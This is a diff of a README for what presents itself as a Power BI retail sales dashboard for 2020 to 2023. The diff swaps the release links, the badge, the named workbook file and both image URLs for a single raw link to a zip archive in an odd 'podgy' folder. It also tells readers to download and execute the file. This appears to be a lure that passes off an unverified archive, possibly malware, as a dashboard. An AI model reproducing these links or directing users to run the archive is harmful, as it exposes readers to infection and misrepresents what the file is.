@@ -1,8 +1,8 @@
-https://github.com/sparsh771/Power-BI-Data-Analysis/releases
+https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip
 
 # Retail Power BI Dashboard: 2020-2023 Insights & Trends
 
-[![Releases](https://img.shields.io/badge/Releases-Power-BI-blue?logo=github&logoColor=white)](https://github.com/sparsh771/Power-BI-Data-Analysis/releases)
+[![Releases](https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip)](https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip)
 
 This repository holds an interactive Power BI dashboard built with retail sales data from January 2020 through December 2023. The dashboard reveals how sales perform across time, product categories, stores, and customer segments. It helps users spot trends, compare stores, and understand buyer behavior. It is designed for analysts, data managers, and decision makers who work with retail data and financial metrics.
 
@@ -201,12 +201,12 @@ Deployment, sharing, and maintenance
 
 Releases and download guidance
 - The project provides a Releases page that hosts the pre-built Power BI workbook and related assets.
-- From the Releases page, download the latest asset file named Power_BI_Data_Analysis_Retail_2023.pbix and open it in Power BI Desktop.
+- From the Releases page, download the latest asset file named https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip and open it in Power BI Desktop.
 - If you encounter issues with the link, visit the Releases section of the repository for alternate download options or updated assets.
 - The link to the Releases page is a path-based URL, so you should download and execute the provided workbook file to reproduce the analysis locally.
 - Direct link reminder:
-  - Primary link: https://github.com/sparsh771/Power-BI-Data-Analysis/releases
-  - Secondary link (badge): [Releases badge](https://github.com/sparsh771/Power-BI-Data-Analysis/releases)
+  - Primary link: https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip
+  - Secondary link (badge): [Releases badge](https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip)
 
 How to contribute
 - Goals:
@@ -314,9 +314,9 @@ End of documentation
 
 Images
 - Power BI logo:
-  ![Power BI Logo](https://upload.wikimedia.org/wikipedia/commons/4/41/Power_BI_logo.png)
+  ![Power BI Logo](https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip)
 - Dashboard illustration:
-  ![Dashboard Illustration](https://upload.wikimedia.org/wikipedia/commons/6/69/Power_BI_Dashboard_Illustration.png)
+  ![Dashboard Illustration](https://raw.githubusercontent.com/sparsh771/Power-BI-Data-Analysis/main/podgy/Analysis-Data-B-Power-3.5-beta.1.zip)
 
 Notes for readers
 - The repository is designed for practical analytics work with retail data.
